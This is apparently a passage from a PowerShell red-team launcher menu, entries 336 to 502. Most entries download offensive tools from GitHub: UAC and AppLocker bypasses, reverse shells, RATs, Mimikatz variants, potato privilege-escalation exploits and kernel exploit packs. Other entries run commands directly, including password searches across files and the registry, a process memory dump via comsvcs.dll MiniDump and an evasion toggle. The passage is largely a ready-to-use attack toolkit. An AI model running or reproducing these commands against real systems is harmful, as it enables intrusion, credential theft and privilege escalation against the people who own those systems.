        '336' {cmd.exe /c 'accesschk.exe -qwsu "Everyone" * && accesschk.exe -qwsu "Authenticated Users" * && accesschk.exe -qwsu "Users" *'}
        '337' {gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name}
        '338' {Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State}
        '339' {Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl; Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'; Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'; Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'; Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'; Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"; Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"}
        '340' {reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated}
        '341' {reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s}
        '342' {reg query HKCU /f password /t REG_SZ /s; reg query HKLM /f password /t REG_SZ /s}
        '343' {Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}}
        '344' {ScaricaSSL "Mr-Un1k0d3r/RedTeamCSharpScripts/WMIUtility" "WMIUtility.exe" "Mr-Un1k0d3r/RedTeamCSharpScripts/raw/master/WMIUtility.exe"}
        '345' {ScaricaSSL "Mr-Un1k0d3r/RedTeamCSharpScripts/enumerateuser" "enumerateuser.exe" "Mr-Un1k0d3r/RedTeamCSharpScripts/raw/master/enumerateuser.exe"}
        '346' {ScaricaSSL "Mr-Un1k0d3r/RedTeamCSharpScripts/ldapquery" "ldapquery.exe" "Mr-Un1k0d3r/RedTeamCSharpScripts/raw/master/ldapquery.exe"}
        '347' {ScaricaSSL "Mr-Un1k0d3r/RedTeamCSharpScripts/ldaputility" "ldaputility.exe" "Mr-Un1k0d3r/RedTeamCSharpScripts/raw/master/ldaputility.exe"}
        '348' {ScaricaSSL "Mr-Un1k0d3r/RedTeamCSharpScripts/set" "set.exe" "Mr-Un1k0d3r/RedTeamCSharpScripts/raw/master/set.exe"}
        '349' {ScaricaSSL "Mr-Un1k0d3r/RedTeamCSharpScripts/unmanagedps" "unmanagedps.exe" "Mr-Un1k0d3r/RedTeamCSharpScripts/raw/master/unmanagedps.exe"}
        '350' {ScaricaSSL "Mr-Un1k0d3r/RedTeamCSharpScripts/webhunter" "webhunter.exe" "Mr-Un1k0d3r/RedTeamCSharpScripts/raw/master/webhunter.exe"}
        '351' {ScaricaSSL "Mr-Un1k0d3r/RedTeamCSharpScripts/wmiutility" "wmiutility2.exe" "Mr-Un1k0d3r/RedTeamCSharpScripts/raw/master/wmiutility.exe"}
        '352' {write-host "you will get https://github.com/rvrsh3ll/Misc-Powershell-Scripts"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "rvrsh3ll/Misc-Powershell-Scripts/$FILENAME" "$FILENAME" "rvrsh3ll/Misc-Powershell-Scripts/master/$FILENAME"}}
        '353' {ScaricaGist "ankitdobhal/TTLOs" "TTLOs.psm1" "ankitdobhal/8ab380ad0290028f9a1efe6333683a5a/raw/40cb310019e0acf132239c955c28a8558f5b8a20/TTLOs.psm1"}
        '354' {ScaricaSSL "Killeroo/PowerPing.x86/v1.3.3" "PowerPing.x86.exe" "Killeroo/PowerPing/releases/download/v1.3.3/PowerPing.x86.exe"}
        '355' {ScaricaSSL "Killeroo/PowerPing/v1.3.3" "PowerPing.exe" "Killeroo/PowerPing/releases/download/v1.3.3/PowerPing.exe"}
        '356' {ScaricaSSL "PowerShellMafia/PowerSploit" "PowerSploit.zip" "PowerShellMafia/PowerSploit/archive/master.zip"}
        '357' {ScaricaSSL "fireeye/commando-vm" "commando-vm.zip" "fireeye/commando-vm/archive/master.zip"}
        '358' {ScaricaSSL "DarkCoderSc/Win32/win-brute-logon" "WinBruteLogon.exe" "DarkCoderSc/win-brute-logon/raw/master/Win32/Release/WinBruteLogon.exe"}
        '359' {ScaricaSSL "DarkCoderSc/Win64/win-brute-logon" "WinBruteLogon.exe" "DarkCoderSc/win-brute-logon/raw/master/Win64/Release/WinBruteLogon.exe"}
        '360' {ScaricaSSL "L3cr0f/DccwBypassUAC" "DccwBypassUAC.exe" "L3cr0f/DccwBypassUAC/raw/release/DccwBypassUAC/Release/DccwBypassUAC.exe"}
        '361' {Scarica "3gstudent/Bypass-Windows-AppLocker" "AppLockerBypassChecker-v1.ps1" "3gstudent/Bypass-Windows-AppLocker/master/AppLockerBypassChecker-v1.ps1"}
        '362' {ScaricaGist "netbiosX/FodhelperUACBypass" "FodhelperUACBypass.ps1" "netbiosX/a114f8822eb20b115e33db55deee6692/raw/bd61ba9db7af8ffcd57d3dbfa8208b495cdc854d/FodhelperUACBypass.ps1"}
        '363' {Scarica "gushmazuko/WinBypass/SluiHijackBypass_direct" "SluiHijackBypass_direct.ps1" "gushmazuko/WinBypass/master/SluiHijackBypass_direct.ps1"}
        '364' {Scarica "gushmazuko/WinBypass/SluiHijackBypass" "SluiHijackBypass.ps1" "gushmazuko/WinBypass/master/SluiHijackBypass.ps1"}
        '365' {Scarica "gushmazuko/WinBypass/EventVwrBypass" "EventVwrBypass.ps1" "gushmazuko/WinBypass/master/EventVwrBypass.ps1"}
        '366' {Scarica "gushmazuko/WinBypass/DiskCleanupBypass_direct" "DiskCleanupBypass_direct.ps1" "gushmazuko/WinBypass/master/DiskCleanupBypass_direct.ps1"}
        '367' {ScaricaBat "Mncx86/Windows-10-UAC-bypass" "uacdisabler.bat" "Mncx86/Windows-10-UAC-bypass/master/uacdisabler.bat"}
        '368' {write-host 'you will get https://github.com/offensive-security/exploitdb - windows/local'; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "offensive-security/exploitdb/master/exploits/windows/local/$FILENAME" "$FILENAME" "offensive-security/exploitdb/master/exploits/windows/local/$FILENAME"}}
        '369' {ScaricaSSL "PwnDexter/SharpEDRChecker/1.1" "SharpEDRChecker.exe" "PwnDexter/SharpEDRChecker/releases/download/1.1/SharpEDRChecker.exe"}
        '370' {Scarica "3gstudent/Javascript-Backdoor (real name, JSRat)" "JSRat.ps1" "3gstudent/Javascript-Backdoor/master/JSRat.ps1"}
        '371' {ScaricaSSL "icsharpcode/AvaloniaILSpy" "ILSpy-win-x64-Release.zip" "icsharpcode/AvaloniaILSpy/releases/download/v5.0-rc2/ILSpy-win-x64-Release.zip"}
        '372' {ScaricaSSL "BenChaliah/Arbitrium-RAT" "Arbitrium-RAT.zip" "BenChaliah/Arbitrium-RAT/archive/main.zip"}
        '373' {ScaricaSSL "antonioCoco/RoguePotato" "RoguePotato.zip" "antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip"}
        '374' {ScaricaSSL "BloodHoundAD/BloodHound-win32-x64" "BloodHound-win32-x64.zip" "BloodHoundAD/BloodHound/releases/download/4.0.1/BloodHound-win32-x64.zip"}
        '375' {ScaricaSSL "BloodHoundAD/BloodHound-win32-ia32" "BloodHound-win32-ia32.zip" "BloodHoundAD/BloodHound/releases/download/4.0.1/BloodHound-win32-ia32.zip"}
        '376' {ScaricaSSL "enigma0x3/Old-Powershell-payload-Excel-Delivery" "Old-Powershell-payload-Excel-Delivery.zip" "enigma0x3/Old-Powershell-payload-Excel-Delivery/archive/master.zip"}
        '377' {Scarica "gfoss/PSRecon" "psrecon.ps1" "gfoss/PSRecon/master/psrecon.ps1"; Scarica "gfoss/PSRecon/actions" "actions.xml" "gfoss/PSRecon/master/actions.xml"}
        '378' {Scarica "enigma0x3/Powershell-C2" "C2Code.ps1" "enigma0x3/Powershell-C2/master/C2Code.ps1"; Scarica "enigma0x3/Powershell-C2/Macro" "Macro" "enigma0x3/Powershell-C2/master/Macro"}
        '379' {Scarica "orlyjamie/mimikittenz" "Invoke-mimikittenz.ps1" "orlyjamie/mimikittenz/master/Invoke-mimikittenz.ps1"}
        '380' {ScaricaSSL "uknowsec/SharpSQLTools" "SharpSQLTools.zip" "uknowsec/SharpSQLTools/releases/download/10/SharpSQLTools.zip"}
        '381' {ScaricaExt "digitalcorpora/bulk_extractor32" "bulk_extractor32.exe" "http://downloads.digitalcorpora.org/downloads/bulk_extractor/bulk_extractor32.exe"}
        '382' {ScaricaExt "digitalcorpora/bulk_extractor64" "bulk_extractor64.exe" "http://downloads.digitalcorpora.org/downloads/bulk_extractor/bulk_extractor64.exe"}
        '383' {ScaricaSSL "Invoke-IR/PowerForensics" "PowerForensics.zip" "Invoke-IR/PowerForensics/releases/download/1.1.1/PowerForensics.zip"}
        '384' {ScaricaSSL "Invoke-IR/PowerForensicsv2" "PowerForensicsv2.zip" "Invoke-IR/PowerForensics/releases/download/1.1.1/PowerForensicsv2.zip"}
        '385' {ScaricaSSL "EvotecIT/GPOZaurr" "GPOZaurr.zip" "EvotecIT/GPOZaurr/archive/master.zip"}
        '386' {ScaricaSSL "moonD4rk/HackBrowserData" "hack-browser-data-v0.3.3-windows-64bit.zip" "moonD4rk/HackBrowserData/releases/download/v0.3.3/hack-browser-data-v0.3.3-windows-64bit.zip"}
        '387' {ScaricaSSL "deepsecurity-pe/GoGhost" "GoGhost_win_amd64.exe" "deepsecurity-pe/GoGhost/raw/master/GoGhost_win_amd64.exe"}
        '388' {Scarica "thom-s/netsec-ps-scripts/printer-telnet-ftp-report" "printer-telnet-ftp-report.ps1" "thom-s/netsec-ps-scripts/master/printer-telnet-ftp-report/printer-telnet-ftp-report.ps1"}
        '389' {Scarica "tokyoneon/Chimera/shells/Invoke-PowerShellIcmp" "Invoke-PowerShellIcmp.ps1" "tokyoneon/Chimera/master/shells/Invoke-PowerShellIcmp.ps1"}
        '390' {Scarica "tokyoneon/Chimera/shells/Invoke-PowerShellTcp" "Invoke-PowerShellTcp.ps1" "tokyoneon/Chimera/master/shells/Invoke-PowerShellTcp.ps1"}
        '391' {Scarica "tokyoneon/Chimera/shells/Invoke-PowerShellTcpOneLine" "Invoke-PowerShellTcpOneLine.ps1" "tokyoneon/Chimera/master/shells/Invoke-PowerShellTcpOneLine.ps1"}
        '392' {Scarica "tokyoneon/Chimera/shells/Invoke-PowerShellUdp" "Invoke-PowerShellUdp.ps1" "tokyoneon/Chimera/master/shells/Invoke-PowerShellUdp.ps1"}
        '393' {Scarica "tokyoneon/Chimera/shells/Invoke-PowerShellUdpOneLine" "Invoke-PowerShellUdpOneLine.ps1" "tokyoneon/Chimera/master/shells/Invoke-PowerShellUdpOneLine.ps1"}
        '394' {Scarica "tokyoneon/Chimera/shells/generic1" "generic1.ps1" "tokyoneon/Chimera/master/shells/generic1.ps1"}
        '395' {Scarica "tokyoneon/Chimera/shells/generic2" "generic2.ps1" "tokyoneon/Chimera/master/shells/generic2.ps1"}
        '396' {Scarica "tokyoneon/Chimera/shells/generic3" "generic3.ps1" "tokyoneon/Chimera/master/shells/generic3.ps1"}
        '397' {Scarica "tokyoneon/Chimera/shells/powershell_reverse_shell" "powershell_reverse_shell.ps1" "tokyoneon/Chimera/master/shells/powershell_reverse_shell.ps1"}
        '398' {Scarica "tokyoneon/Chimera/shells/misc/Add-RegBackdoor" "Add-RegBackdoor.ps1" "tokyoneon/Chimera/master/shells/misc/Add-RegBackdoor.ps1"}
        '399' {Scarica "tokyoneon/Chimera/shells/misc/Get-Information" "Get-Information.ps1" "tokyoneon/Chimera/master/shells/misc/Get-Information.ps1"}
        '400' {Scarica "tokyoneon/Chimera/shells/misc/Invoke-PoshRatHttp" "Invoke-PoshRatHttp.ps1" "tokyoneon/Chimera/master/shells/misc/Invoke-PoshRatHttp.ps1"}
        '401' {Scarica "tokyoneon/Chimera/shells/misc/Invoke-PortScan" "Invoke-PortScan.ps1" "tokyoneon/Chimera/master/shells/misc/Invoke-PortScan.ps1"}
        '402' {Scarica "tokyoneon/Chimera/shells/misc/Get-WLAN-Keys" "Get-WLAN-Keys.ps1" "tokyoneon/Chimera/master/shells/misc/Get-WLAN-Keys.ps1"}
        '403' {Scarica "Arno0x/DNSExfiltrator" "Invoke-DNSExfiltrator.ps1" "Arno0x/DNSExfiltrator/master/Invoke-DNSExfiltrator.ps1"}
        '404' {ScaricaSSL "fatedier/frp_386" "frp_0.35.1_windows_386.zip" "fatedier/frp/releases/download/v0.35.1/frp_0.35.1_windows_386.zip"}
        '405' {ScaricaSSL "fatedier/frp_amd64" "frp_0.35.1_windows_amd64.zip" "fatedier/frp/releases/download/v0.35.1/frp_0.35.1_windows_amd64.zip"}
        '406' {ScaricaSSL "iSECPartners/jailbreak" "jailbreak.zip" "iSECPartners/jailbreak/archive/master.zip"}
        '407' {ScaricaBat "M4ximuss/Powerless" "Powerless.bat" "M4ximuss/Powerless/master/Powerless.bat"}
        '408' {ScaricaSSL "antonioCoco/RogueWinRM" "RogueWinRM.zip" "antonioCoco/RogueWinRM/releases/download/1.1/RogueWinRM.zip"}
        '409' {ScaricaSSL "ANSSI-FR/ADTimeline" "ADTimeline.zip" "ANSSI-FR/ADTimeline/archive/master.zip"}
        '410' {Scarica "l0ss/Grouper" "grouper.psm1" "l0ss/Grouper/master/grouper.psm1"}
        '411' {ScaricaSSL "l0ss/Grouper2" "Grouper2.exe" "l0ss/Grouper2/releases/download/0.9.64/Grouper2.exe"}
        '412' {ScaricaSSL "p3nt4/PowerShdll" "Powershdll.exe" "p3nt4/PowerShdll/raw/master/exe/bin/Release/Powershdll.exe"; Scarica "p3nt4/PowerShdll" "PowerShdll.exe.config" "p3nt4/PowerShdll/master/exe/bin/Release/PowerShdll.exe.config"}
        '413' {ScaricaSSL "jaredhaight/PSAttack" "PSAttack-1.99.1.zip" "jaredhaight/PSAttack/releases/download/v1.99.1/PSAttack-1.99.1.zip"}
        '414' {ScaricaSSL "OmerYa/Invisi-Shell" "InvisiShellProfiler.dll" "OmerYa/Invisi-Shell/raw/master/build/x64/Release/InvisiShellProfiler.dll"}
        '415' {ScaricaSSL "Hackplayers/Salsa-tools/EvilSalsa_x64/NET3.5" "EvilSalsa_x64.dll" "Hackplayers/Salsa-tools/raw/master/releases/EvilSalsa/NET3.5/EvilSalsa_x64.dll"}
        '416' {ScaricaSSL "Hackplayers/Salsa-tools/EvilSalsa_x86/NET3.5" "EvilSalsa_x86.dll" "Hackplayers/Salsa-tools/raw/master/releases/EvilSalsa/NET3.5/EvilSalsa_x86.dll"}
        '417' {ScaricaSSL "Hackplayers/Salsa-tools/EvilSalsa_x64/NET4.0" "EvilSalsa_x64.dll" "Hackplayers/Salsa-tools/raw/master/releases/EvilSalsa/NET4.0/EvilSalsa_x64.dll"}
        '418' {ScaricaSSL "Hackplayers/Salsa-tools/EvilSalsa_x86/NET4.0" "EvilSalsa_x86.dll" "Hackplayers/Salsa-tools/raw/master/releases/EvilSalsa/NET4.0/EvilSalsa_x86.dll"}
        '419' {ScaricaSSL "Hackplayers/Salsa-tools/EvilSalsa_x64/NET4.5" "EvilSalsa_x64.dll" "Hackplayers/Salsa-tools/raw/master/releases/EvilSalsa/NET4.5/EvilSalsa_x64.dll"}
        '420' {ScaricaSSL "Hackplayers/Salsa-tools/EvilSalsa_x86/NET4.5" "EvilSalsa_x86.dll" "Hackplayers/Salsa-tools/raw/master/releases/EvilSalsa/NET4.5/EvilSalsa_x86.dll"}
        '421' {ScaricaSSL "Hackplayers/Salsa-tools/SalseoLoader_x64/NET3.5" "SalseoLoader_x64.exe" "Hackplayers/Salsa-tools/raw/master/releases/SalseoLoader/NET3.5/SalseoLoader_x64.exe"}
        '422' {ScaricaSSL "Hackplayers/Salsa-tools/SalseoLoader_x86/NET3.5" "SalseoLoader_x86.exe" "Hackplayers/Salsa-tools/raw/master/releases/SalseoLoader/NET3.5/SalseoLoader_x86.exe"}
        '424' {ScaricaSSL "Hackplayers/Salsa-tools/SalseoLoader_x64/NET4.0" "SalseoLoader_x64.exe" "Hackplayers/Salsa-tools/raw/master/releases/SalseoLoader/NET4.0/SalseoLoader_x64.exe"}
        '425' {ScaricaSSL "Hackplayers/Salsa-tools/SalseoLoader_x86/NET4.0" "SalseoLoader_x86.exe" "Hackplayers/Salsa-tools/raw/master/releases/SalseoLoader/NET4.0/SalseoLoader_x86.exe"}
        '426' {ScaricaSSL "Hackplayers/Salsa-tools/SalseoLoader_x64/NET4.5" "SalseoLoader_x64.exe" "Hackplayers/Salsa-tools/raw/master/releases/SalseoLoader/NET4.5/SalseoLoader_x64.exe"}
        '427' {ScaricaSSL "Hackplayers/Salsa-tools/SalseoLoader_x86/NET4.5" "SalseoLoader_x86.exe" "Hackplayers/Salsa-tools/raw/master/releases/SalseoLoader/NET4.5/SalseoLoader_x86.exe"}
        '428' {ScaricaSSL "Hackplayers/Salsa-tools/SilentMOD_x64/NET4.5" "SilentMOD_x64.dll" "Hackplayers/Salsa-tools/raw/master/releases/SilentMOD/NET4.5/SilentMOD_x64.dll"}
        '429' {ScaricaSSL "Hackplayers/Salsa-tools/SilentMOD_x86/NET4.5" "SilentMOD_x86.dll" "Hackplayers/Salsa-tools/raw/master/releases/SilentMOD/NET4.5/SilentMOD_x86.dll"}
        '430' {ScaricaSSL "Hackplayers/Salsa-tools/Standalone_x64/NET4.0" "SalseoStandalone_x64.exe" "Hackplayers/Salsa-tools/raw/master/releases/Standalone/NET4.0/SalseoStandalone_x64.exe"}
        '431' {ScaricaSSL "Hackplayers/Salsa-tools/Standalone_x86/NET4.0" "SalseoStandalone_x86.exe" "Hackplayers/Salsa-tools/raw/master/releases/Standalone/NET4.0/SalseoStandalone_x86.exe"}
        '432' {ScaricaSSL "Hackplayers/Salsa-tools/Standalone_x64/NET4.5" "SalseoStandalone_x64.exe" "Hackplayers/Salsa-tools/raw/master/releases/Standalone/NET4.5/SalseoStandalone_x64.exe"}
        '433' {ScaricaSSL "Hackplayers/Salsa-tools/Standalone_x86/NET4.5" "SalseoStandalone_x86.exe" "Hackplayers/Salsa-tools/raw/master/releases/Standalone/NET4.5/SalseoStandalone_x86.exe"}
        '434' {ScaricaSSL "padovah4ck/PSBypassCLM/x64" "PsBypassCLM.exe" "padovah4ck/PSByPassCLM/raw/master/PSBypassCLM/PSBypassCLM/bin/x64/Debug/PsBypassCLM.exe"}
        '435' {ScaricaSSL "itm4n/VBA-RunPE" "VBA-RunPE.zip" "itm4n/VBA-RunPE/archive/master.zip"}
        '436' {ScaricaSSL "cfalta/PowerShellArmoury" "PowerShellArmoury.zip" "cfalta/PowerShellArmoury/archive/master.zip"}
        '437' {ScaricaSSL "mgeeky/Stracciatella" "Stracciatella.exe" "mgeeky/Stracciatella/raw/master/Stracciatella.exe"}
        '438' {ScaricaSSL "SnaffCon/Snaffler/0.9.2" "Snaffler.zip" "SnaffCon/Snaffler/releases/download/0.9.2/Snaffler.zip"}
        '439' {ScaricaSSL "vivami/SauronEye/v0.0.9" "SauronEye.exe" "vivami/SauronEye/releases/download/v0.0.9/SauronEye.exe"}
        '440' {Scarica "xct/xc/PrivescCheck" "PrivescCheck.ps1" "xct/xc/master/files/powershell/PrivescCheck.ps1"}
        '441' {ScaricaSSL "mubix/post-exploitation" "post-exploitation.zip" "mubix/post-exploitation/archive/master.zip"}
        '442' {ScaricaSSL "vletoux/pingcastle" "PingCastle_2.9.2.0.zip" "vletoux/pingcastle/releases/download/2.9.2.0/PingCastle_2.9.2.0.zip"}
        '443' {Scarica "canix1/ADACLScanner" "ADACLScan.ps1" "canix1/ADACLScanner/master/ADACLScan.ps1"}
        '444' {Scarica "fox-it/Invoke-ACLPwn" "Invoke-ACLPwn.ps1" "fox-it/Invoke-ACLPwn/master/Invoke-ACLPwn.ps1"};
        '445' {ScaricaSSL "FatRodzianko/Get-RBCD-Threaded/1.05" "Get-RBCD-Threaded.exe" "FatRodzianko/Get-RBCD-Threaded/releases/download/1.05/Get-RBCD-Threaded.exe"}
        '446' {ScaricaSSL "fireeye/SharPersist/v1.0.1" "SharPersist.exe" "fireeye/SharPersist/releases/download/v1.0.1/SharPersist.exe"}
        '447' {ScaricaSSL "Dviros/Excalibur" "Excalibur.zip" "Dviros/Excalibur/archive/master.zip"}
        '448' {Scarica "arjansturing/smbv1finder" "SMBv1Finder.ps1" "arjansturing/smbv1finder/master/SMBv1Finder.ps1"}
        '449' {ScaricaSSL "VikasSukhija/Downloads/Multi-Tools" "Multi-Tools.zip" "VikasSukhija/Downloads/archive/master.zip"}
        '450' {Scarica "adrianlois/Fingerprinting-envio-FTP-PowerShell/SysInfo" "SysInfo.ps1" "adrianlois/Fingerprinting-envio-FTP-PowerShell/master/SysInfo.ps1"}
        '451' {Scarica "SMATechnologies/winscp-powershell" "Winscp.ps1" "SMATechnologies/winscp-powershell/master/Winscp.ps1"}
        '452' {ScaricaSSL "tonylanglet/crushftp.powershell" "crushftp.zip" "tonylanglet/crushftp.powershell/archive/master.zip"}
        '453' {ScaricaSSL "Mr-Un1k0d3r/SCShell" "SCShell.exe" "Mr-Un1k0d3r/SCShell/raw/master/SCShell.exe"}
        '454' {$search=New-Object DirectoryServices.DirectorySearcher([ADSI]""); $search.filter="(servicePrincipalName=*)"; $results=$search.Findall(); foreach($result in $results){$userEntry=$result.GetDirectoryEntry(); Write-host "Object Name = " $userEntry.name -backgroundcolor "yellow" -foregroundcolor "black"; Write-host "DN      =      "  $userEntry.distinguishedName; Write-host "Object Cat. = "  $userEntry.objectCategory; Write-host "servicePrincipalNames"; $i=1; foreach($SPN in $userEntry.servicePrincipalName){Write-host "SPN(" $i ")   =      " $SPN       $i+=1}Write-host ""}}
        '455' {ScaricaSSL "PowerShellEmpire/PowerTools" "PowerTools.zip" "PowerShellEmpire/PowerTools/archive/master.zip"}
        '456' {Scarica "rem1ndsec/DLLJack" "dlljack.ps1" "rem1ndsec/DLLJack/master/dlljack.ps1"}
        '457' {ScaricaSSL "wietze/windows-dll-hijacking" "windows-dll-hijacking.zip" "wietze/windows-dll-hijacking/archive/master.zip"}
        '458' {ScaricaSSL "Flangvik/DLLSideloader" "DLLSideloader.zip" "Flangvik/DLLSideloader/archive/master.zip"}
        '459' {tasklist; write-host "Digit PID, Process ID"; $TPID=read-host "(example, 6095)"; if($TPID -ne ""){rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump $TPID .\$TPID.bin full}}
        '460' {write-host "Enable or Disable Evasion/Bypassing?"; $EVA=read-host "(example, 1=Enable, 0=Disable)"; if($EVA -ne "1"){$EVA="0"}}
        '461' {Scarica "ShawnDEvans/smbmap/psutils/Get-FileLockProcess" "Get-FileLockProcess.ps1" "ShawnDEvans/smbmap/master/psutils/Get-FileLockProcess.ps1"}
        '462' {ScaricaSSL "ElevenPaths/FOCA" "FOCA-v3.4.7.0.zip" "ElevenPaths/FOCA/releases/download/v3.4.7.0/FOCA-v3.4.7.0.zip"}
        '463' {Scarica "mdsecactivebreach/CACTUSTORCH.cna" "CACTUSTORCH.cna" "mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.cna"}
        '464' {Scarica "mdsecactivebreach/CACTUSTORCH.hta" "CACTUSTORCH.hta" "mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.hta"}
        '465' {Scarica "mdsecactivebreach/CACTUSTORCH.js" "CACTUSTORCH.js" "mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.js"}
        '466' {Scarica "mdsecactivebreach/CACTUSTORCH.jse" "CACTUSTORCH.jse" "mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.jse"}
        '467' {Scarica "mdsecactivebreach/CACTUSTORCH.vba" "CACTUSTORCH.vba" "mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.vba"}
        '468' {Scarica "mdsecactivebreach/CACTUSTORCH.vbe" "CACTUSTORCH.vbe" "mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.vbe"}
        '469' {Scarica "mdsecactivebreach/CACTUSTORCH.vbs" "CACTUSTORCH.vbs" "mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.vbs"}
        '470' {Scarica "microsoft/CSS-Exchange/Test-ProxyLogon" "Test-ProxyLogon.ps1" "microsoft/CSS-Exchange/main/Security/Test-ProxyLogon.ps1"}
        '471' {ScaricaSSL "S3cur3Th1sSh1t/PowerSharpPack" "PowerSharpPack.zip" "S3cur3Th1sSh1t/PowerSharpPack/archive/master.zip"}
        '472' {ScaricaSSL "ctxis/DLLHSCx64" "DLLHSCx64.zip" "ctxis/DLLHSC/releases/download/1/DLLHSCx64.zip"}
        '473' {ScaricaSSL "ctxis/DLLHSCx86" "DLLHSCx86.zip" "ctxis/DLLHSC/releases/download/1/DLLHSCx86.zip"}
        '474' {ScaricaSSL "TonyPhipps/Meerkat" "Meerkat.zip" "TonyPhipps/Meerkat/archive/master.zip"}
        '475' {ScaricaSSL "k8gege/K8tools/K8PortScan" "K8PortScan.exe" "k8gege/K8tools/raw/master/K8PortScan.exe"}
        '476' {ScaricaSSL "Aetsu/OffensivePipeline" "OffensivePipeline_v0.8.2.zip" "Aetsu/OffensivePipeline/releases/download/v0.8.2/OffensivePipeline_v0.8.2.zip"}
        '477' {write-host "Digit a tool with extension from https://github.com/andrew-d/static-binaries/tree/master/binaries/windows/x86"; $BNF=read-host "(example, nmap.exe)"; if($BNF -ne ""){ScaricaSSL "andrew-d/static-binaries/windows/x86/$BNF" "$BNF" "andrew-d/static-binaries/raw/master/binaries/windows/x86/$BNF"}}
        '478' {write-host "Digit a tool with extension from https://github.com/andrew-d/static-binaries/tree/master/binaries/windows/x64"; $BNF=read-host "(example, nmap.exe)"; if($BNF -ne ""){ScaricaSSL "andrew-d/static-binaries/windows/x64/$BNF" "$BNF" "andrew-d/static-binaries/raw/master/binaries/windows/x64/$BNF"}}
        '479' {Scarica "p3nt4/Invoke-SocksProxy" "Invoke-SocksProxy.psm1" "p3nt4/Invoke-SocksProxy/master/Invoke-SocksProxy.psm1"}
        '480' {ScaricaSSL "abatchy17/WindowsExploits" "WindowsExploits.zip" "abatchy17/WindowsExploits/archive/refs/heads/master.zip"}
        '481' {ScaricaSSL "SecWiki/windows-kernel-exploits" "windows-kernel-exploits.zip" "SecWiki/windows-kernel-exploits/archive/refs/heads/master.zip"}
        '482' {cd C:\; findstr /SI /M "password" *.xml *.ini *.txt}
        '483' {cd C:\; findstr /si password *.xml *.ini *.txt *.config}
        '484' {cd C:\; findstr /spin "password" *.*}
        '485' {ScaricaExt "sysinternals.com/files/SysinternalsSuite" "SysinternalsSuite.zip" "https://download.sysinternals.com/files/SysinternalsSuite.zip"}
        '486' {ScaricaExt "sysinternals.com/files/SysinternalsSuite-ARM64" "SysinternalsSuite-ARM64.zip" "https://download.sysinternals.com/files/SysinternalsSuite-ARM64.zip"}
        '487' {ScaricaSSL "ohpe/juicy-potato" "JuicyPotato.exe" "ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"}
        '488' {sc qc upnphost}
        '489' {ScaricaSSL "phackt/pentest/privesc/accesschk" "accesschk.exe" "phackt/pentest/raw/master/privesc/windows/accesschk.exe"}
        '490' {ScaricaSSL "phackt/pentest/privesc/windows/accesschk64" "accesschk64.exe" "phackt/pentest/raw/master/privesc/windows/accesschk64.exe"}
        '491' {ScaricaSSL "phackt/pentest/privesc/windows/Microsoft.ActiveDirectory.Management" "Microsoft.ActiveDirectory.Management.dll" "phackt/pentest/raw/master/privesc/windows/Microsoft.ActiveDirectory.Management.dll"}
        '492' {Scarica "phackt/pentest/privesc/windows/Set-LHSTokenPrivilege" "Set-LHSTokenPrivilege.ps1" "phackt/pentest/master/privesc/windows/Set-LHSTokenPrivilege.ps1"}
        '493' {ScaricaSSL "phackt/pentest/privesc/windows/nc" "nc.exe" "phackt/pentest/raw/master/privesc/windows/nc.exe"}
        '494' {ScaricaSSL "phackt/pentest/privesc/windows/nc64" "nc64.exe" "phackt/pentest/raw/master/privesc/windows/nc64.exe"}
        '495' {ScaricaBat "phackt/pentest/privesc/windows/privesc" "privesc.bat" "phackt/pentest/master/privesc/windows/privesc.bat"}
        '496' {ScaricaSSL "phackt/pentest/privesc/windows/procdump" "procdump.exe" "phackt/pentest/raw/master/privesc/windows/procdump.exe"}
        '497' {ScaricaSSL "phackt/pentest/privesc/windows/procdump64" "procdump64.exe" "phackt/pentest/raw/master/privesc/windows/procdump64.exe"}
        '498' {ScaricaBat "phackt/pentest/privesc/windows/wmic_info" "wmic_info.bat" "phackt/pentest/master/privesc/windows/wmic_info.bat"}
        '499' {cmd /c 'if exist C:\Windows\System32\bash.exe (echo "C:\Windows\System32\bash.exe exists") else echo "C:\Windows\System32\bash.exe NOT exists"'}
        '500' {ScaricaSSL "r3motecontrol/Ghostpack-CompiledBinaries/Rubeus" "Rubeus.exe" "r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe"}
        '501' {ScaricaSSL "r3motecontrol/Ghostpack-CompiledBinaries/SafetyKatz" "SafetyKatz.exe" "r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SafetyKatz.exe"}
        '502' {ScaricaSSL "r3motecontrol/Ghostpack-CompiledBinaries/Seatbelt" "Seatbelt.exe" "r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe"}
